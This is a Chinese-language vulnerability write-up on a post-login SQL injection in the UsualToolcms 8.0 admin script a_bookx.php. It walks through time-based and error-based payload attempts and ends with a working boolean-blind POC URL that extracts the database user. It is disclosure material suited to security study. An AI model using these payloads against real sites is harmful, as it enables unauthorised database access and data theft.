UsualToolcms 8.0 a\_bookx.php 后台注入漏洞
==========================================

一、漏洞简介
------------

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

![1.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId24.png)

mysqli\_query不支持堆叠，无回显初步构造payload：

    t=move&id[0]=1',(select 1 and sleep(10)),'2

执行的SQL语句：

    UPDATE `cms_book` set catid='' WHERE id in('1',(select 1 and sleep(10)),'2')

能够正确执行的SQL语句：

    UPDATE `cms_book` set catid='' WHERE id in(1,(select 1 and sleep(10)))

因此初步设想以失败告终，\$result返回bool值，True显示咨询删除成功，false则显示咨询删除失败则可以if构造语句，语句判断语句为真则执行一条可执行的语句，假若为假执行一条报错语句即可使result为False的语句

updatexml，if条件真假与否都会报错

![2.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId25.png)

extractvalue，if条件真假与否都会报错

![3.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId26.png)

join报错:`select id from mysql.user a join mysql.user b ，result`返回结果均为true

![4.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId27.png)

floor报错：`SELECT COUNT(*) FROM user GROUP BY FLOOR(RAND(0)*2);`同样返回结果均为true

![5.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId28.png)

exp():
mysql\>=5.5.5会报错;mysql\>=5.5.53，报错不能注出数据，我这里为5.5.53，但是可以用于使语句返回结果为false

![6.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId29.png)

### POC：

    https://www.0-sec.org/demo/cmsadmin/a_bookx.php?t=move&id[0]=1%27)or%20if((substr((select%20user()),1,1))=%27d%27,(select%201),exp(~0));%23

![7.png](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0a_bookx.php后台注入漏洞/media/rId31.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
